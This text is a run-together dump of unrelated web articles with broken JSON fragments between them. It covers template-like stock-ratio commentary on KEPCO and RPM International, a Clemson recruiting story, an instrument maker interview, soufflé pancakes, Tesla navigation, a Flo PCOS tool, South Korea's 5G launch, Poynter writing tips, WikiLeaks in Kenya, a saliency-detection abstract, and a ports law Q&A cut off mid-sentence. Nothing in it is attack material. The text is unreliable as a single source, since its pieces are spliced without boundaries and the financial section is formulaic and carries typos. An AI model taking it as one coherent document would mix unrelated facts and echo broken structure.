\nThe Price to book ratio is the current share price of a company divided by the book value per share. The Price to Book ratio for Korea Electric Power Corporation KOSE:A015760 is 0.264631. A lower price to book ratio indicates that the stock might be undervalued. Similarly, Price to cash flow ratio is another helpful ratio in determining a company\u2019s value. The Price to Cash Flow for Korea Electric Power Corporation (KOSE:A015760) is 2.762889. This ratio is calculated by dividing the market value of a company by cash from operating activities. Additionally, the price to earnings ratio is another popular way for analysts and investors to determine a company\u2019s profitability. The price to earnings ratio for Korea Electric Power Corporation (KOSE:A015760) is -14.039959. This ratio is found by taking the current share price and dividing by earnings per share. \nSome investors will scour the markets looking for cheap, quality stocks. These stocks can be attractive for investors looking to find a bargain that could turn into a big winner. Investors may be cautious when searching for these types of stocks. Often times, a stock will see a huge jump and then everyone will hop on the bandwagon to buy without checking into the fundamentals. Sometimes this strategy may work out, but in many cases, the stock has already made the run and become too expensive to add to the portfolio. Conducting diligent research and constantly adding to the individual\u2019s overall market education level may help the investor sift through the sea of stocks and find those names that are really worth getting into. \nIn order to determine if a company is fairly valued, we can look at a number of different ratios and metrics. First off we\u2019ll take a look at the Price to Cash Flow ratio of RPM International Inc. (NYSE:RPM). The firm currently has a P/CF ratio of 19.919699. \nThis is the current Price divided by Cash Flow Per Share for the trailing twelve months. Cash Flow is defined as Income After Taxes minus Preferred Dividends and General Partner Distributions plus Depreciation, Depletion and Amortization. \nAt times, stock market volatility can wreak havoc on investors. When the market becomes highly volatile, investors may get the jitters and think they need to rush to action. In the heat of the moment, it can be tricky to see the clear skies in the distance. Investors may be best served at times to just let the cards fall where they may and not try to be a hero and drastically change the portfolio. Following a solid plan may allow investors to lay off the gas when times get tough. If the research is well done and the plan is in place, sticking to the plan might be the call. Of course nobody wants to see a significant drop in the value of stocks that they own. Being able to see the overall picture when the markets become turbulent may allow the investor to move forward with confidence. \nProfitability \nThe Return on Invested Capital (aka ROIC) for RPM International Inc. (NYSE:RPM) is 0.228359. The Return on Invested Capital is a ratio that determines whether a company is profitable or not. It tells investors how well a company is turning their capital into profits. The ROIC is calculated by dividing the net operating profit (or EBIT) by the employed capital. The employed capital is calculated by subrating current liabilities from total assets. Similarly, the Return on Invested Capital Quality ratio is a tool in evaluating the quality of a company\u2019s ROIC over the course of five years. The ROIC Quality of RPM International Inc. (NYSE:RPM) is 13.296654. This is calculated by dividing the five year average ROIC by the Standard Deviation of the 5 year ROIC. The ROIC 5 year average is calculated using the five year average EBIT, five year average (net working capital and net fixed assets). The ROIC 5 year average of RPM International Inc. (NYSE:RPM) is 0.278952. \nRPM International Inc. (NYSE:RPM) has a Price to Book ratio of 5.469082. This ratio is calculated by dividing the current share price by the book value per share. Investors may use Price to Book to display how the market portrays the value of a stock. Checking in on some other ratios, the company has a Price to Cash Flow ratio of 19.919699, and a current Price to Earnings ratio of 36.612352. The P/E ratio is one of the most common ratios used for figuring out whether a company is overvalued or undervalued. \nAfter a recent scan, we can see that RPM International Inc. (NYSE:RPM) has a Shareholder Yield of 0.038325 and a Shareholder Yield (Mebane Faber) of 0.00014. The first value is calculated by adding the dividend yield to the percentage of repurchased shares. The second value adds in the net debt repaid yield to the calculation. Shareholder yield has the ability to show how much money the firm is giving back to shareholders via a few different avenues. Companies may issue new shares and buy back their own shares. This may occur at the same time. Investors may also use shareholder yield to gauge a baseline rate of return. \nThe EBITDA Yield is a great way to determine a company\u2019s profitability. This number is calculated by dividing a company\u2019s earnings before interest, taxes, depreciation and amortization by the company\u2019s enterprise value. Enterprise Value is calculated by taking the market capitalization plus debt, minority interest and preferred shares, minus total cash and cash equivalents. The EBITDA Yield for RPM International Inc. (NYSE:RPM) is 0.058830. \nThere are many different tools to determine whether a company is profitable or not. One of the most popular ratios is the \u201cReturn on Assets\u201d (aka ROA). This score indicates how profitable a company is relative to its total assets. The Return on Assets for RPM International Inc. (NYSE:RPM) is 0.041859. This number is calculated by dividing net income after tax by the company\u2019s total assets. A company that manages their assets well will have a higher return, while a company that manages their assets poorly will have a lower return. \nQuant Scores \nThe Gross Margin Score is calculated by looking at the Gross Margin and the overall stability of the company over the course of 8 years. The score is a number between one and one hundred (1 being best and 100 being the worst). The Gross Margin Score of RPM International Inc. (NYSE:RPM) is 2.00000. The more stable the company, the lower the score. If a company is less stable over the course of time, they will have a higher score. \nThe C-Score is a system developed by James Montier that helps determine whether a company is involved in falsifying their financial statements. The C-Score is calculated by a variety of items, including a growing difference in net income verse cash flow, increasing days outstanding, growing days sales of inventory, increasing assets to sales, declines in depreciation, and high total asset growth. The C-Score of RPM International Inc. (NYSE:RPM) is 2.00000. The score ranges on a scale of -1 to 6. If the score is -1, then there is not enough information to determine the C-Score. If the number is at zero (0) then there is no evidence of fraudulent book cooking, whereas a number of 6 indicates a high likelihood of fraudulent activity. The C-Score assists investors in assessing the likelihood of a company cheating in the books. \nThe ERP5 Rank is an investment tool that analysts use to discover undervalued companies. The ERP5 looks at the Price to Book ratio, Earnings Yield, ROIC and 5 year average ROIC. The ERP5 of RPM International Inc. (NYSE:RPM) is 6933. The lower the ERP5 rank, the more undervalued a company is thought to be. \nAt the time of writing, RPM International Inc. (NYSE:RPM) has a Piotroski F-Score of 4. The F-Score may help discover companies with strengthening balance sheets. The score may also be used to spot the weak performers. Joseph Piotroski developed the F-Score which employs nine different variables based on the company financial statement. A single point is assigned to each test that a stock passes. Typically, a stock scoring an 8 or 9 would be seen as strong. On the other end, a stock with a score from 0-2 would be viewed as weak. \nChecking in on some valuation rankings, RPM International Inc. (NYSE:RPM) has a Value Composite score of 54. Developed by James O\u2019Shaughnessy, the VC score uses five valuation ratios. These ratios are price to earnings, price to cash flow, EBITDA to EV, price to book value, and price to sales. The VC is displayed as a number between 1 and 100. In general, a company with a score closer to 0 would be seen as undervalued, and a score closer to 100 would indicate an overvalued company. Adding a sixth ratio, shareholder yield, we can view the Value Composite 2 score which is currently sitting at 45. \nWith the stock market still riding high, bear market scenarios may not be at the forefront of the average investor\u2019s mind. There are plenty of professionals out there that are predicting that the markets will be turning south in the near future. There are others who believe that the bulls are still in control, and they will be leading the charge higher over the next few months. Nobody knows for sure which scenario will play out, but being ready for any market situation may turn out to be a portfolio savior in the long-term. Any time the stock market drops sharply or sees sustained losses, investors may start to worry. These declines are usually followed by extreme headlines from financial news outlets. It is important to remember that corrections are a normal part of market cycles. Being able to control panic and pessimism may be a great skill for the investor to use when times get tough. Knowing exactly what stocks are in the portfolio can help make unsettling market conditions bearable for investors. If the hard research has been done and the plan is in motion, there may not be any need to second guess and cause more problems before things turn around and smooth out.",

      "text": "Clemson will play host to one of the country\u2019s top sophomore linebacker prospects this weekend, as Carrollton (Ga.) four-star Chaz Chambliss is set to return to Death Valley. \n\u201cI\u2019m going Saturday to the spring game,\u201d Chambliss told The Clemson Insider at the Under Armour All-America Camp in Atlanta on Sunday. \nChambliss, a highly regarded class of 2021 recruit, most recently visited Clemson for the South Carolina game last season, and the atmosphere in Death Valley made a lasting impression on him. \n\u201cI remember, first off, when you walk into the stadium, how many fans are there,\u201d he said. \u201cIt\u2019s roaring.\u201d \n2021 linebacker Chaz Chambliss works out at the Under Armor All America Camp in Roswell, GA Sunday March 31, 2019. Bart Boatwright/The Clemson Insider \nChambliss claims no favorites in his recruitment right now, but he is high on Clemson and admits the thought of potentially playing for a guy like Brent Venables is appealing to him. \n\u201cIt\u2019d be exciting,\u201d Chambliss said. \u201cJust like him, it would radiate and it would be an energetic defense.\u201d \nChambliss, who has collected two dozen offers already, is keeping a close eye on one thing in particular as he goes through the recruiting process. \n\u201cIf I see myself there for four years,\u201d he said. \u201cJust if I feel family there.\u201d \nChambliss made his latest visit to Alabama last Thursday. He is also planning to visit Auburn soon. \nChambliss is teammates with Clemson four-star linebacker commit Kevin Swint, who participated in the Under Armour All-America Camp on Sunday as well. \nMove over Alabama, Clemson is the new King of College Football. In our new magazine \u201cLittle Ole Clemson\u201d: The Best \u201cLittle\u201d Dynasty Ever , we examine not just the 2018 team\u2019s run to being \u201cthe best ever\u201d but examine the last four seasons and how Dabo Swinney turned Clemson into the new dynasty of college football. We also take a look at the role former athletic director Terry Don Phillips played. We go behind the scenes at the Tigers\u2019 run to a second national championship in three seasons and the previous three national championship runs. It also features stories on the Power Rangers, the 2018 senior class, high quality photos and much, much more. \nWe are pleased to announce that our latest magazine is ready for order.

      "title": "5 Questions with Bill Hollander of High Precision Devices",
      "text": "Bill Hollander is a self-taught instrument maker and a businessman. He launched High Precision Devices, Inc. in 1993 with one employee to make custom instruments needed for specialized research projects. Over the years, his company has earned a global reputation for designing and manufacturing complex scientific instruments required by researchers at universities, government labs and private companies. \nThe company, which is based in Boulder, has helped clients across the world in a variety of fields, including cryogenics, optics, aerospace, medical, telecommunications, super computing and the semi-conductor industry. Among its long list of customers are the National Institute of Standards and Technology, NASA, the National Oceanic and Atmospheric Administration, Massachusetts Institute of Technology, Harvard University, the University of Colorado Boulder, Raytheon, a defense contractor, and other commercial and academic researchers. \nHigh Precision Devices has developed custom cryostats.(An apparatus for maintaining a very low temperature, say below 1 Kelvin, or close to absolute zero, which is minus 273.16 degrees on the Celsius scale and minus 459.67 degrees on the Fahrenheit scale). Custom cryostats are used to cool ultra-sensitive detectors (cameras) on telescopes that are located in Antarctica, on mountain tops in Hawaii and Chile, on high-altitude balloons and airplanes. Other cryostats are used in the development of quantum computers and superconducting computers. \nHigh Precision Devices also has designed and built optical, mechanical, vacuum and electronic instruments for environmental monitoring. NOAA uses the company's instruments to collect samples to determine the amount of carbon dioxide and other trace gases in theatmosphere, essential for understanding climate change. \nThe success of the company is based on its partnership with research institutions, the tradition of innovation and the can-do attitude of employees, Hollander said. It's about solving problems, he said. \nRecently, High Precision Devices was recognized in March as the entrepreneur of the year by the Boulder Chamber, and Hollander, president and CEO of the company, received the award in front of a full house. \nWe talked with Hollander at his office in Gunbarrel to learn about the experiences that shaped him and his outlook on life and business. \nThe following interview has been edited for length and clarity. \n1. How do you define yourself and your work? \nI'm an instrument maker. An instrument maker is one part physicist, one part engineer, one part technician and one part machinist. I didn't go to school to be an instrument maker. I quit college after a year. I was bored.(Hollander attended the University of Oregon). \nI'm also a tinkerer. In 1978, I began working for JILA, one of the nation's leading research institutes in the physical sciences. (It began in 1962 as a joint institute of the University of Colorado Boulder and the National Institute of Standards and Technology). JILA offered me the opportunity to work with great minds, and helped me understand the different parts of the scientific process. It helped me figure out where my strengths lay. \nMy JILA experience helped me establish relationships with scientists and taught me how to interact with them to solve their instrument problems. \nOften researchers have a rough idea about what they want to do or achieve, and it's my job to understand their needs and design a product that aids their research process. It's about turning an idea into a physical reality. \n2. What prompted you to start your company? \nJILA was dedicated to taking care of its own scientists. After working there for 11 years, I saw a potential business opportunity in providing scientific instruments to other academic bodies and research institutions, including those managed by corporations. A research lab might have the capability to make the instruments it requires, but it may not have the need, or the necessary scaling or testing ability. This creates space and a need for a company like HPD to exist. \n3. What's the typical process of fulfilling a client's need? \nWe hear from customers about their projects and what they need to accomplish. They give us some rough specs, or a diagram. It could be in the form of a napkin sketch. \nBased on that preliminary interaction, we design an instrument that would serve their needs. It could be a specific part, a component within another device or a larger system that complements researchers' apparatus. \nThere may be several iterations of the design before clients approve it. Using specialized software, our engineers show the clients multi-dimensional views of the product they need. \nAfter we get the green signal, the design is fed into a machine for fabrication. \nWe often have people work in teams to achieve that. Our employees include Ph.D.s, engineers, physicists, instrument scientists, machinists and personnel in sales and marketing. \n4. Is it hard to find employees? What qualities do you look for in potential hires? \nHiring is a challenge. We are looking for specific skills, qualifications and experience. We cast a wide net both locally and nationally to recruit talent. Generally, we look at universities and government labs when we're looking to hire. Many times we have had people, who are familiar with our work, contact us for potential jobs. \nI have advertised for positions in addition on the company website, on LinkedIn, and even Craigslist. Last year, we put out an ad for an engineer and received about 500 applications in the process. We eventually hired two. \nWe are looking for smarts, integrity and a collaborative attitude. \nWe plan to increase our capabilities, expand into related technical fields, and find new applications for our products, for example in the semi-conductor industry associated with cryogenic computing. \n5.Tell me about a project of which you are proud \nI'm really proud of the Laser Interferometer Gravitational-Wave Observatory (LIGO) isolation platform that supports and helps stabilize the lasers inside the interferometer to detect gravity wave signals that are emitted during massive events in the farthest reaches of the universe, such as collapsing of stars and formation and merger of black holes. The seismic isolation platform is one element that helps isolate other confusing noises. This key component in the device helped prove Albert Einstein's gravitational wave theory. The three physicists who worked to prove the theory won the Nobel Prize in 2017. \nHPD engineers worked for seven years, from 2000 to 2007, developing three generations of isolation platforms, improving each version after designing, manufacturing and testing it for the LIGO project. \nPratik Joshi: 303-684-5310, pjoshi@dailycamera.com",

      "text": "The just-opened Gram Cafe and Pancakes at the Stonestown Galleria is one of several Asian food businesses drawing crowds to the otherwise faded shopping center \u2014 and it's serving an Instagram-trending dish that's kinda sorta sweeping the nation. \nSouffl\u00e9 pancakes have been a thing in Japan for about five years, and the trend subsequently has made it to the States with one cafe in Pasadena that serves them, and a couple of spots in New York \u2014 prompting the New York Times to report on the trend this week . \nAs Eater SF reports , this is the first US outpost for Gram Cafe, which was founded in Osaka, Japan in 2014 and now boasts 60 locations across Thailand, Indonesia, Australia, and Canada. The Stonestown location comes to us via a Bay Area couple, Peter and Dorothy Wong, who tasted the pancakes on a trip to Japan and rightly sensed that San Franciscan's would line up for them. \nAnd lining up they have. \nPartly at issue with Gram Cafe is there's scarcity built into the restaurant's model: Only 30 servings of the jiggly, easily deflated pancakes get served in three timed batches throughout the day: 11 a.m., 3 p.m., and 6 p.m. As the Chronicle reports , eager eaters were lined up at 8 a.m. for Gram Cafe's opening day, and the first round was declared \"sold out\" as of 10:30. \nThere's plenty more on the menu, though, as Eater notes, besides the \"premium\" pancakes \u2014 which are made by pouring an egg-white-heavy batter into molds on a griddle. There's French toast, egg dishes, and other, flatter pancake options including savory ones like the \u201ctaco pancakes\u201d topped with chili and cheese, pancakes topped with smoked salmon, and some just-in-SF pancakes made with red bean matcha and layered with whipped matcha mascarpone (see Instagram pic below). \nAs for the rest of the dining scene at Stonestown, the Chronicle notes that the mall has turned heavily toward food to make up for the dwindling draw of traditional retail, with a third of its spaces now dedicated to food and drink. And seven out of ten recent openings are Asian businesses, including Yi Fang Taiwan Fruit Tea, Shihlin Taiwan Street Snacks, and Marugame Udon . \nView this post on Instagram \nA post shared by NewsLadyEats (@newsladyeats) on Apr 3, 2019 at 7:43pm PDT \nView this post on Instagram \nA post shared by Leenaa (@queenmacro) on Apr 10, 2019 at 11:48am PDT",

      "title": "Tesla's Navigation Eliminates The Need To Plan Charging Stops On Road Trips",
      "text": "Tesla\u2019s Navigation Eliminates The Need To Plan Charging Stops On Road Trips \nMarch 26th, 2019 by Kyle Field \nTesla posted a new video to its YouTube account that shows yet another perfect family in their perfectly clean Tesla Model S taking a road trip to a ski resort in Austria for vacation. My Tesla Model 3 never seems to be clean, with random crayons, papers, books, and toy parts in every crevice, but that\u2019s another story. The quick video (below) made me reflect on one of the huge benefits of Tesla\u2019s navigation system compared to the ones from other automakers: automatic charging stop integration. \nVIDEO \nIn a Tesla, no additional effort is required to find charging spots on road trips. The onboard navigation system automatically builds Supercharging stops into the trip, along with the amount of time that the car needs to charge before heading on to the next stop on the journey. \nChanan Bos and I enjoyed this feature on our recent trip back down from Tesla\u2019s Fremont Factory, where, along with CleanTechnica Director Zachary Shahan, we were given a behind-the-scenes tour of the auto factory as well as the nearby seat factory. More on that later\u2026 \nOn the drive south, Chanan and I stopped just outside of the madness of the Bay Area in Gilroy, California, to top up our charge and grab some coffee before making the much longer drive down the length of California. \nImage credit: Tesla \nThe onboard navigation automagically calculates the miles being driven, estimates the impact of the geography across the route and the temperature (among other things) in order to come up with an estimated range for the vehicle. The navigation then determines whether additional range is needed to reach the destination, and if so, a Supercharging stop is added as the next destination in the journey and factored into the total travel time. \nIt sounds simple, and it is, but the impact that this small change has on driving an electric vehicle \u2014 or any vehicle, for that matter \u2014 is profound. It eliminates the need to plan refueling stops or to wonder how long the vehicle needs to charge. It eliminated the need to wonder what the charging speed will be at the new station, as all Tesla Superchargers are DC fast charging stations. In short, the integration of the vehicle\u2019s current state of charge and charging stops into the in-vehicle navigation software is a game changer, and as anyone who has used it can attest, it makes driving and charging an electric vehicle on road trips that much easier. \nEditor\u2019s note: I used Tesla\u2019s brilliant navigation system for a 19 hour one-way drive from Poland to Paris . I echo everything Kyle says. As I\u2019ve said several times as well, this smart navigation system, especially combined with Autopilot, actually makes a road trip in a Tesla considerably more relaxing and enjoyable than a road trip in a gas car. There\u2019s no beating a road trip in a Tesla, imho. \u2014Zach \nAbout the Author \nKyle Field I'm a tech geek passionately in search of actionable ways to reduce the negative impact my life has on the planet, save money and reduce stress.

      "text": "In recognition of Polycystic Ovary Syndrome (PCOS) Awareness Month, Flo , a digital platform for women\u2019s health and wellbeing, has announced the successful launch of PCOS Health Assistant, a self-assessment tool to help identify the risk of PCOS. \nPCOS is a hormonal disorder found in women that can cause irregular periods, higher than normal levels of androgen, a male hormone, and enlarged or malfunctioning ovaries. The condition can also lead to infertility, diabetes, cardiovascular disease, sleep apnea, and strokes . Despite affecting 1 in 10 women of childbearing age, PCOS is hard to diagnose. \nTo address this challenge, Flo\u2019s PCOS Health Assistant uses an algorithm to detect whether certain combinations of symptoms self-identified by the user represent a potential risk for PCOS. The algorithm works for users who have consistently logged their period for at least the past 6 months. If PCOS risk is identified from this data, users are engaged by a chatbot that captures additional information about the individual and recommends they speak with their doctor if increased risk is detected. For those users diagnosed with PCOS by a physician, Flo provides ongoing educational information to support management of the condition. \nTo date, the PCOS Health Assistant has engaged over 250,000 Flo users. Among the 9,000 users who followed up on feedback provided by the tool, 1,500 confirmed a diagnosis of PCOS and 1,400 were diagnosed with other health issues. In surveys, an impressive 83% of Flo users said that they would share their period data with an app in order to see if they have an increased risk for certain medical conditions, like PCOS. \n\u201cPCOS is a health issue that is often undiagnosed and misunderstood,\u201d said vice president of product Kamila Staryga. \u201cIrregularities in our cycles are absolutely clinically normal, so learning which deviations are a signal of something that needs to be verified with a doctor is truly empowering\u2026 PCOS Health Assistant is the first step in Flo\u2019s digital self-assessment roadmap, with heavy menstrual bleeding and endometriosis coming, to provide women with more knowledge that will allow them to take better control of their health and make informed decisions to improve their quality of life.\u201d \nFor the month of September, Flo will provide the PCOS Health Assistant on-demand to all Flo users who use its platform in English in the Health Insights section of the app. The Flo period tracker app is currently available on iOS and Android. \nVIDEO \nLink: Flo homepage\u2026",

      "title": "S.Korea first to roll out 5G services, beating U.S. and China",
      "text": "Reuters \n \nBy Ju-min Park \nSEOUL, April 3 (Reuters) - South Korea will become the first country to commercially launch fifth-generation (5G) services on Friday as it rolls out the latest wireless technology with Samsung Electronics' new 5G-enabled smartphone Galaxy S10. \nWith one of the world's top smartphone penetration rates, South Korea is in a race with China, the United States and Japan to market 5G, hoping the technology will spur breakthrough in fields such as smart cities and autonomous cars, and drive up its economic growth that slowed to a six-year low in 2018. \n5G will change the landscape of the gaming industry as it allows games streamed with minimal delay to be played on smartphones, Ryu added. \nThe technology can offer 20-times faster data speeds than 4G long-term evolution (LTE) networks and better support for artificial intelligence and virtual reality with low latency. \nSometimes it can offer 100-times faster speeds. \nSouth Korean carriers have spent billions on campaigns marketing 5G and, on Wednesday, SK Telecom showed off K-pop stars and an Olympic gold medalist as its first 5G customers. \nSK Telecom is working with its memory-chip making affiliate SK Hynix to build a highly digitised and connected factory powered by 5G technology, Ryu said. \nThe operator expects about 1 million 5G customers by end-2019. It has a total of 27 million users. \nSmaller rival KT Corp is set to offer cheaper plans than its LTE service, with unlimited data and 4-year instalments to buy 5G devices. \nSamsung was the first to unwrap a 5G phone in February when it unveiled the Galaxy S10 5G and a nearly $2,000 folding smartphone, putting the world's top smartphone maker by volume in pole position in the 5G race, some analysts say. \nSmaller local rival LG Electronics plans to release its 5G smartphone in South Korea later this month. \nIn the United States, carrier Verizon plans to launch its 5G network in two cities on April 11. \nSECURITY CONCERNS \nWhile security concerns over 5G networks using telecom equipment made by China'sHuawei have marred the buildup to the release of these services, South Korean telcos have tried to shrug them off. \n\"I don't think we have a security issue in South Korea,\" Park Jin-hyo, head of SK Telecom's information and communication tech research centre, told reporters. \nHe added that the company uses advanced technology to block eavesdropping or hacking into 5G networks. \nAmong South Korea's top three telecom operators, SK Telecom and KT Corp do not use Huawei equipment for 5G. Smaller carrier LG Uplus uses Huawei gear. \nBut SK Telecom officials said it was likely there will be an open auction for network equipment makers including Huawei if South Korea needs more base stations for higher frequencies. \n($1 = 1,135.5600 won)",

There are classics, cobwebs and things that haven\u2019t aged that well. Our writing tips, as you might guess, remain classics. \nThis holiday season, whether you\u2019re taking some time off or stuck at the office, we thought we\u2019d put some of those classics in one place for you to discover or rediscover. \nWhat I learned about writing from \u2026 \nThis is a genre Poynter\u2019s Roy Peter Clark has created over the years, with timely and insightful observations on the craft and its practitioners, including: \nMichele Obama\u2019s 2016 DNC speech : \u201cLiberate your pronouns. Use first person, second person and third person to create specific effects.\u201d \nGreta Thunberg\u2019s U.N. speech : \u201cShort sentences have the feeling of gospel truth. Here we get a series of them. She will not let her audience off the hook with a long flowing sentence. Each period is like a hammer pounded on the podium.\u201d \nAretha Franklin\u2019s music : \u201cThis is one of the most important lessons for young journalists and writers everywhere: An idea is not a story. An assignment is not a story. A topic is not a story. It may take a while \u2014 quite a while \u2014 but the hard work of the writing process eventually transforms something vague into something focused. Once that focus is discovered \u2014 in an exploratory draft, a lead, a nut graph, a theme, a kicker \u2014 it can be rendered in the authentic voice of the writer.\u201d \nGame of Thrones : \u201cPay attention to the names of things \u2013 I do not believe we ever get the names of Ramsay\u2019s killer dogs. But we do get the names of almost everything and everyone else. The three dragons have names. The dire wolves rescued by the Stark children have names, and, happily, we see Jon Snow reunited with Ghost at the very end. To the earliest days of heroic literature, great weapons have names, such as Excalibur. Arya receives the gift of her first sword, Needle, and carries it throughout her journey. \u201cStick him with the pointy end\u201d becomes her whimsical mantra. The story takes us beyond names to nicknames: Jaime Lannister is known as the Kingslayer. The Clegane brothers become the Mountain and the Hound. Dany is the Mother of Dragons.\u201d \nRELATED TRAINING: Writing with voice and structure \nOn the writing process: \nOn grammar and style: \nWriting tools: \nKristen Hare covers the transformation of local news for Poynter.org .

      "title": "How Kenya gave Julian Assange\u2019s WikiLeaks its first major global scoop",
      "text": "British police this week arrested WikiLeaks founder Julian Assange at the Ecuadorian embassy in London in response to a US extradition request on charges that he helped hack Pentagon computers in 2010. \nThe arrest marked the end of an era and the beginning of a new one for the white-bearded Assange, whose embattled web organization emboldened whistleblowers, exposed the secrets of the moneyed and powerful, and redefined journalism and the meaning of journalistic ethics in the digital age. \nIn many ways, the story of WikiLeaks and its transformation from an underground hacking outfit into a global anti-secrecy organization began in Kenya. After founding WikiLeaks in 2006, Assange traveled there in 2007 to attend the World Social Forum in Nairobi. The meeting was first held in Brazil in 2001 and coincides annually with the gathering of political and business leaders at the World Economic Forum in Davos, Switzerland. \nMore than 80,000 people gathered at the anti-capitalist forum that year, with many hoping to network with other activists and protest global policies they said hurt the poor. One of those people was Assange himself, \u201cwho spent four days in a WSF tent with his three friends, giving talks, handing out flyers and making connections,\u201d according to David Leigh and Luke Harding\u2019s book on WikiLeaks . During his stay, the computer hacker met key people from sectors including journalism and human rights, and emboldened by their \u201ccourage\u201d and the atmosphere in the capital, stayed the next two years. \nJulian Assange, far right, at the 2007 World Social Forum in Kenya \nBut by Aug. 2007, Kenya helped WikiLeaks deliver its first big scoop. Assange got hold of a report by the international risk consultancy Kroll, which detailed how Kenya\u2019s second president Daniel Arap Moi and his family swindled billions of US dollars out of the country and stashed them in secret trusts and shell companies. Commissioned by Moi\u2019s successor president Mwai Kibaki, the report was submitted in 2004 but was never released or acted upon. \nAssange gave the leaked report to The Guardian , who broke the story worldwide. The report caused an uproar in Kenya and brought into focus the impunity enjoyed by officials emptying state coffers. Ironically, soon after Kibaki\u2019s administration launched the Kroll investigation, it was rocked by its own multi-million-dollar scam involving awarding government contracts to bogus firms. \nMarching during the 2007 World Social Forum. \nDelegates at the 2007 World Social Forum in Nairobi. \nIn September 2008, WikiLeaks published another report titled \u201cThe Cry of Blood,\u201d which detailed a so-called high-level policy to disappear and kill young Kenyan men. The report was based on evidence obtained by the Kenyan National Commission on Human Rights, even though the report wasn\u2019t published on their website. Two lawyers involved in investigating the extrajudicial killings were later killed . The report helped boost Assange\u2019s profile globally, winning him the prestigious Amnesty International New Media Award in 2009. \nAssange was still adamant about exposing Kenya\u2019s corrupt elite. When, in 2009, the British journalist Michela Wrong published her hard-hitting book It\u2019s Our Turn to Eat about the Kenyan anti-corruption czar turned whistleblower John Githongo, WikiLeaks was quick to publish a PDF copy of the book on its platform. \nMany Kenyan bookstores were worried about selling the book because of the possible libel suits that could come from the officials named in the book. Wrong reached out to WikiLeaks to take down the book since it constituted a violation of copyright. \nIn email exchanges with WikiLeaks shared by Wrong with Quartz Africa , an anonymous WikiLeaks responder says they thought she or Githongo leaked the book for \u201cpromotional reasons.\u201d Wrong believes the electronic copy was probably stolen from a Kenyan newspaper that was preparing to serialize the book in its pages. \u201cThat said, the importance of the work in Kenya as an instrument of political struggle eclipses your individual involvement,\u201d reads the grating response to Wrong. \u201cIt is your baby, and I\u2019m sure it feels like that, but it is also its own adult\u2014and Kenya\u2019s son.\u201d \nAfter Wrong complained to WikiLeaks again on Mar. 16, Assange himself responded and said they would remove the copy while waiting to hear from her publisher for possible rights purchases. That deal never materialized. \n\u201cThe case is interesting because this was a violation of copyright, involving a commercial publication, a book not banned by any African government, not a secret document. It left me feeling pretty jaundiced,\u201d Wrong said. \nProtesting Assange\u2019s arrest in Berlin. \nOver the years, secret documents published by WikiLeaks have repeatedly touched on Kenya, whether it\u2019s the controversial sale of arms to South Sudan or the deeply corrupt nature of the Kenyan cabinet. Yet Assange has never forgotten the significance of his first journalistic coup\u2014 even declaring the Kroll report release \u201cchanged the result\u201d of the 2007 Kenyan general election. \nWhile that could be interpreted as a self-serving remark given the country\u2019s complex political dynamics, the experience in Kenya lay the basis for what the prophet of the age of leaks always wanted to achieve. \n\u201cYou have to start with the truth,\u201d he told The Guardian in 2010. \u201cThe truth is the only way that we can get anywhere. Because any decision-making that is based upon lies or ignorance can\u2019t lead to a good conclusion.\u201d \nSign up to the Quartz Africa Weekly Brief here for news and analysis on African business, tech and innovation in your inbox",

      "text": "The high cost of pixel-level annotations makes it appealing to train saliency detection models with weak supervision. However, a single weak supervision source usually does not contain enough information to train a well-performing model. To this end, we propose a unified framework to train saliency detection models with diverse weak supervision sources. In this paper, we use category labels, captions, and unlabelled data for training, yet other supervision sources can also be plugged into this flexible framework. We design a classification network (CNet) and a caption generation network (PNet), which learn to predict object categories and generate captions, respectively, meanwhile highlight the most important regions for corresponding tasks. An attention transfer loss is designed to transmit supervision signal between networks, such that the network designed to be trained with one supervision source can benefit from another. An attention coherence loss is defined on unlabelled data to encourage the networks to detect generally salient regions instead of task-specific regions. We use CNet and PNet to generate pixel-level pseudo labels to train a saliency prediction network (SNet). During the testing phases, we only need SNet to predict saliency maps. Experiments demonstrate the performance of our method compares favourably against unsupervised and weakly supervised methods and even some supervised methods.",

      "title": "Ports & Terminals in the USA",
      "text": "Use the Lexology Getting The Deal Through tool to compare the answers in this article with those from other jurisdictions. \nGeneral \nKey ports \nWhich are the key ports in your jurisdiction and what sort of facilities do they comprise? What is the primary purpose of the ports? \nThe US has a large and diverse marine terminal industry. In terms of total tonnage (foreign and domestic), the port of New Orleans, LA, is the nation\u2019s busiest, serving as a hub for dry bulk cargo (eg, grain, coal, steel and ore) and liquid bulk cargo, including a growing petroleum and petrochemical export market. Houston, TX, stands as the country\u2019s busiest port for foreign cargo by tonnage, driven by its massive energy trade. \nFor container shipping, the San Pedro Bay ports of Los Angeles and Long Beach, when viewed together, are the country\u2019s biggest gateway. However, the Port of New York and New Jersey is a close second, and East Coast ports Savannah, GA, Norfolk, VA, Charleston, SC, and Jacksonville, FL, are important gateways as well. \nIn South Florida, the ports of Miami and Port Everglades represent key hubs in the trade with Latin America and the Caribbean, and are also home to the country\u2019s largest cruise terminals. And in the middle of the country, the Mississippi River (the country\u2019s largest waterway) and the Great Lakes continue to have their own thriving and diverse marine terminal industries. Accordingly, drawing broad generalisations about the domestic terminal industry, and its challenges and opportunities, can be difficult. \nGood sources of official data about maritime cargo types and volumes include the Army Corps of Engineers Waterborne Commerce Statistics Center and the US Department of Transportation Maritime Administration (MARAD) Maritime Open Data Portal. \nReform \nDescribe any port reform that has been undertaken over the past few decades and the principal port model or models in your jurisdiction. \nFor container terminals (and also most large breakbulk, general cargo and roll-on, roll-off (ro-ro) facilities), the most common operating model is the landlord port, whereby the berth and backlands are owned by a state or local port authority and leased to a marine terminal operator. For large terminals, the trend has moved towards longer lease terms and greater infrastructure investment by the lessee terminal operators, in order to meet the critical financing needs for port infrastructure repair and expansion. \nHowever, for historical and local reasons, this ownership model can vary from port to port. For example, in some major ports like Virginia, the facilities continue to be operated by a single government-owned corporation, although private stevedoring companies can compete within those terminals. Similarly, Port Houston is an \u2018operating port\u2019, rather than a \u2018landlord port\u2019, and has invested heavily on new infrastructure and technology at its two container terminals in recent years. \nAlso, while private ownership of container ports is relatively uncommon, private ownership of liquid and dry bulk terminal facilities (petroleum, grains, ores, etc) is more commonplace. The country\u2019s largest independent operator of bulk terminal facilities is energy and infrastructure giant Kinder Morgan Energy Partners LP. It and several other large pipeline and infrastructure operators (generally structured as master limited partnerships) have invested billions of dollars in developing bulk cargo terminal facilities in recent years, buoyed in large part by the growth of the US energy sector. \nState development policy \nIs there an overall state policy for the development of ports in your jurisdiction? \nIn the US, port development is influenced by numerous overlapping laws, regulations and policies at the federal, state and local levels. \nAt the federal level, the US government has not played a significant a role in directing maritime and port development, particularly as compared to other modes, such as highways and mass transit. Unlike those other modes, 